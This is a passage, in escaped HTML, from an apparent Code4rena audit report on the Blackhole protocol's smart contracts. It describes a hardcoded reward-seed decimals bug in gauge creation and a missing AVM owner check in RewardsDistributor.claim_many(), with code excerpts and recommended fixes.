class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function is responsible for setting up initial incentives for Algebra concentrated liquidity farms, it uses a hardcoded reward amount of \u003ccode\u003e1e10\u003c/code\u003e raw units. This fixed amount is then used to determine the \u003ccode\u003erewardRate\u003c/code\u003e for the initial seeding of the Algebra farm \u003ccode\u003e(rewardRate = uint128(reward/remainingTimeInCurrentEpoch))\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThe core issue is that \u003ccode\u003e1e10\u003c/code\u003e raw units represent a vastly different actual value and intended incentive level depending on the \u003ccode\u003e_rewardToken\u003c/code\u003e number of decimals:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFor an 18-decimal token: \u003ccode\u003e1e10\u003c/code\u003e raw units is 0.00000001 of a full token. This is typically an insignificant “dust” amount.\u003c/li\u003e\n\u003cli\u003eFor a 6-decimal token (e.g., USDC): \u003ccode\u003e1e10\u003c/code\u003e raw units is 10,000 full tokens (\u003ccode\u003e$10,000 if 1 token = $1\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eFor an 8-decimal token (e.g., WBTC): \u003ccode\u003e1e10\u003c/code\u003e raw units is 100 full tokens (\u003ccode\u003e$10,000,000 if 1 token = $100,000\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis fixed raw unit amount does not adapt to the specific \u003ccode\u003e_rewardToken\u003c/code\u003e being used for the gauge. As a result, if \u003ccode\u003e_rewardToken\u003c/code\u003e is low decimal token such as \u003ccode\u003eUSDC\u003c/code\u003e  or \u003ccode\u003eWBTC\u003c/code\u003e the resulting \u003ccode\u003erewardRate\u003c/code\u003e will be astronomically high which cause a huge loss for the protocol.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eModify the \u003ccode\u003eGaugeFactoryCL.createGauge\u003c/code\u003e function to accept an initial reward amount parameter. This allows the caller to specify an appropriate seed amount tailored to the specific \u003ccode\u003e_rewardToken\u003c/code\u003e, its decimals, and its value.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-29\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-04-logic-error-in-avm-original-owner-resolution\" style=\"position:relative;\"\u003e\u003ca href=\"#m-04-logic-error-in-avm-original-owner-resolution\" aria-label=\"m 04 logic error in avm original owner resolution permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-245\"\u003e[M-04] Logic error in AVM original owner resolution\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-114\"\u003emaze\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-239\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/RewardsDistributor.sol#L196-L247\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-2\" aria-label=\"finding description 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe RewardsDistributor contract contains an inconsistency in how it handles tokens managed by the Auto Voting Escrow Manager (AVM) system. In the \u003ccode\u003eclaim()\u003c/code\u003e function, there’s code to check if a token is managed by AVM and, if so, to retrieve the original owner for sending rewards. However, this critical check is missing in the \u003ccode\u003eclaim_many()\u003c/code\u003e function.\u003c/p\u003e\n\u003cp\u003eThis creates a discrepancy in reward distribution where:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eclaim()\u003c/code\u003e correctly sends rewards to the original owner of an AVM-managed token\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eclaim_many()\u003c/code\u003e incorrectly sends rewards to the current NFT owner (the AVM contract itself)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eRelevant code from \u003ccode\u003eclaim()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenIdToAVMId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) != \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetOriginalOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRelevant code from \u003ccode\u003eclaim_many()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit_for\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis inconsistency has significant impact for users who have delegated their tokens to the AVM system:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUsers who have expired locks and whose tokens are managed by AVM will lose their rewards if \u003ccode\u003eclaim_many()\u003c/code\u003e is called instead of \u003ccode\u003eclaim()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe rewards will be sent to the AVM contract, which has no mechanism to forward these tokens to their rightful owners.\u003c/li\u003e\n\u003cli\u003eThis results in permanent loss of rewards for affected users.\u003c/li\u003e\n\u003cli\u003eSince \u003ccode\u003eclaim_many()\u003c/code\u003e is more gas efficient for claiming multiple tokens, it’s likely to be frequently used, increasing the likelihood and impact of this issue.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAdd the AVM check to the \u003ccode\u003eclaim_many()\u003c/code\u003e function to match the behavior in \u003ccode\u003eclaim()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_locked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPermanent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nftOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_voting_escrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenId\u003c/span\u003e\u003cspan 